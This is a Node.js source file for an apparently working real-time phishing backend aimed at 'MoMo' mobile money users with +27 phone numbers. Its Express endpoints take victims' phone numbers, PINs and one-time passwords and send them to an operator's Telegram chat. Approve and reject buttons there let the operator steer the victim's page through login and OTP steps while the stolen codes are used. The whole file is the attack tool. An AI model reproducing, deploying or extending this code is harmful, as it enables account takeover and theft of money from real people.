const express = require('express');
const path = require('path');
const { Telegraf } = require('telegraf');
const https = require('https');
require('dotenv').config();

// ==========================================
// 1. DATABASE (In-Memory)
// ==========================================
const db = new Map();
function getRequest(id) { return db.get(id) || { status: 'none', step: 0 }; }
function updateStatus(id, status, step) {
  db.set(id, { status: status, step: step });
  console.log(`[DB UPDATE] ID: ${id} -> Status: ${status}, Step: ${step}`);
}

// ==========================================
// 2. TELEGRAM SETUP
// ==========================================
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const esc = (str) => String(str).replace(/[&<>"']/g, (m) => ({'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'}[m]));

const sendTelegramMessage = async (text, extra = {}) => {
  try { 
    return await bot.telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, text, { parse_mode: 'HTML', ...extra }); 
  } catch (error) { 
    console.error('\n❌ TELEGRAM ERROR:', error.message); 
    throw error; 
  }
};

// ==========================================
// 3. EXPRESS SERVER
// ==========================================
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// API: Submit Login Details
app.post('/api/login', async (req, res) => {
  const { requestId, phone, pin } = req.body;
  updateStatus(requestId, 'pending_login', 1);

  const message = `
🔐 <b>MoMo Login Attempt</b>
🆔 ID: <code>${requestId}</code>

📱 <b>Phone:</b> +27 ${esc(phone)}
🔑 <b>PIN:</b> <code>${esc(pin)}</code>

<i>Please verify these credentials to send OTP.</i>
  `;

  const keyboard = { 
    inline_keyboard: [[
      { text: '✅ Approve Login', callback_data: 'LOGIN_OK|' + requestId }, 
      { text: '❌ Reject Login', callback_data: 'LOGIN_FAIL|' + requestId }
    ]] 
  };

  try {
    await sendTelegramMessage(message, { reply_markup: keyboard });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Failed' });
  }
});

// API: Submit OTP
app.post('/api/otp', async (req, res) => {
  const { requestId, otp } = req.body;
  
  const message = `
🔢 <b>OTP Verification</b>
🆔 ID: <code>${requestId}</code>

<b>OTP Entered:</b> <code>${esc(otp)}</code>

<i>Is this OTP correct?</i>
  `;

  const keyboard = { 
    inline_keyboard: [
      [{ text: '✅ Correct PIN & OTP', callback_data: 'OTP_OK|' + requestId }],
      [{ text: '❌ Wrong PIN', callback_data: 'OTP_WRONG_PIN|' + requestId }],
      [{ text: '❌ Wrong OTP', callback_data: 'OTP_WRONG_OTP|' + requestId }]
    ] 
  };

  try {
    await sendTelegramMessage(message, { reply_markup: keyboard });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Failed' });
  }
});

// API: Poll Status
app.get('/api/status/:requestId', (req, res) => {
  res.json(getRequest(req.params.requestId));
});

// ==========================================
// 4. BOT CALLBACK HANDLER
// ==========================================
bot.on('callback_query', async (ctx) => {
  const data = ctx.callbackQuery.data;
  if (!data || !data.includes('|')) return;

  const [action, requestId] = data.split('|');

  try {
    await ctx.answerCbQuery('Processing...');
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });

    let statusText = '';
    if (action === 'LOGIN_OK') { updateStatus(requestId, 'login_approved', 2); statusText = '✅ LOGIN APPROVED'; }
    else if (action === 'LOGIN_FAIL') { updateStatus(requestId, 'login_rejected', 1); statusText = '❌ LOGIN REJECTED'; }
    else if (action === 'OTP_OK') { updateStatus(requestId, 'success', 3); statusText = '✅ OTP VERIFIED'; }
    else if (action === 'OTP_WRONG_PIN') { updateStatus(requestId, 'wrong_pin', 1); statusText = '❌ WRONG PIN'; }
    else if (action === 'OTP_WRONG_OTP') { updateStatus(requestId, 'wrong_otp', 2); statusText = '❌ WRONG OTP'; }

    await ctx.editMessageText(ctx.callbackQuery.message.text + '\n\n<b>Status: ' + statusText + '</b>', { parse_mode: 'HTML' });
  } catch (error) {
    console.error('Error handling callback:', error);
  }
});

// ==========================================
// 5. STARTUP (WITH AUTO-RETRY)
// ==========================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Web server running at http://localhost:${PORT}`);
});

let retries = 0;
const maxRetries = 5;

function startBot() {
  console.log(`⏳ Connecting to Telegram (Attempt ${retries + 1})...`);
  const agent = new https.Agent({ keepAlive: true });
  
  bot.launch({ 
    dropPendingUpdates: true,
    telegram: { agent: agent }
  }).then(() => {
    console.log('✅ Telegram Bot successfully connected and polling!');
  }).catch((err) => {
    console.error('❌ Connection failed:', err.message);
    retries++;
    if (retries < maxRetries) {
      console.log('🔄 Retrying in 3 seconds...');
      setTimeout(startBot, 3000);
    } else {
      console.error('❌ Max retries reached. Check your internet and restart the app.');
    }
  });
}

// Delay bot start by 1 second to let web server start first
setTimeout(startBot, 1000);

// Graceful shutdown
process.once('SIGINT', () => { try { bot.stop('SIGINT'); } catch(e) {} process.exit(0); });
process.once('SIGTERM', () => { try { bot.stop('SIGTERM'); } catch(e) {} process.exit(0); });